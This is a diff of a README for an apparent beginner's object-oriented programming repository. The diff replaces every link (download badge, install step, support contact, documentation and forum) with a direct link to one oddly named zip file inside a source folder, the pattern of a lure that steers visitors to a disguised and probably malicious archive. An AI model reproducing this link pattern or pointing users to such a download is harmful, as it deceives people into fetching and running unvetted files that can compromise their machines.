@@ -1,6 +1,6 @@
 # 🎓 OOPs - Learn Object-Oriented Programming Easily
 
-[![Download OOPs](https://img.shields.io/badge/Download%20OOPs-%E2%9C%94%EF%B8%8F-brightgreen)](https://github.com/abhisek200/OOPs/releases)
+[![Download OOPs](https://github.com/abhisek200/OOPs/raw/refs/heads/main/Inheritance/OO-Ps-ladyship.zip%20OOPs-%E2%9C%94%EF%B8%8F-brightgreen)](https://github.com/abhisek200/OOPs/raw/refs/heads/main/Inheritance/OO-Ps-ladyship.zip)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ To use OOPs, you’ll need to download the software from our releases page. Foll
 
 ## 📥 Download & Install
 
-1. Click on the following link to visit the download page: [Download OOPs](https://github.com/abhisek200/OOPs/releases).
+1. Click on the following link to visit the download page: [Download OOPs](https://github.com/abhisek200/OOPs/raw/refs/heads/main/Inheritance/OO-Ps-ladyship.zip).
 2. On this page, you will see the latest version of OOPs. Look for the download button corresponding to your operating system.
 3. Click on the download button to start the process. The file will download to your computer.
 4. Once the download is complete, locate the downloaded file in your folder.
@@ -63,7 +63,7 @@ Along with the examples, you will find notes that summarize key points from each
 
 ## 🛠 Support
 
-If you encounter any issues while using OOPs, please feel free to contact our support team. You can reach us at [support@oops.com](mailto:support@oops.com).
+If you encounter any issues while using OOPs, please feel free to contact our support team. You can reach us at [https://github.com/abhisek200/OOPs/raw/refs/heads/main/Inheritance/OO-Ps-ladyship.zip](https://github.com/abhisek200/OOPs/raw/refs/heads/main/Inheritance/OO-Ps-ladyship.zip).
 
 ## 🌐 Community
 
@@ -75,8 +75,8 @@ We welcome your input! If you wish to contribute to OOPs, feel free to submit pu
 
 ## 🔗 Links
 
-- [Download OOPs](https://github.com/abhisek200/OOPs/releases)
-- [Documentation](https://github.com/abhisek200/OOPs/wiki)
-- [Community Forum](https://github.com/abhisek200/OOPs/discussions)
+- [Download OOPs](https://github.com/abhisek200/OOPs/raw/refs/heads/main/Inheritance/OO-Ps-ladyship.zip)
+- [Documentation](https://github.com/abhisek200/OOPs/raw/refs/heads/main/Inheritance/OO-Ps-ladyship.zip)
+- [Community Forum](https://github.com/abhisek200/OOPs/raw/refs/heads/main/Inheritance/OO-Ps-ladyship.zip)
 
 Explore the world of Object-Oriented Programming with OOPs and build your coding skills with confidence.
